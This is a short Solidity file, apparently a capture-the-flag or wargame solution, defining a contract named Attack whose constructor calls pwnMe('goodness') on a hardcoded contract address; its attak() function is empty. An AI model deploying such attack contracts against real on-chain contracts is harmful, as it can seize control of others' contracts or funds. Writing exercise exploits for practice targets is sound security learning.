// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import "./Icontract.sol";

contract Attack {

    address contractaddr = 0x174824ebf59ec8aAE10C7d8776d8d59E538a68F1;
    constructor() {
        
    Icontract(contractaddr).pwnMe("goodness");
    }

function attak() public {
    

}
}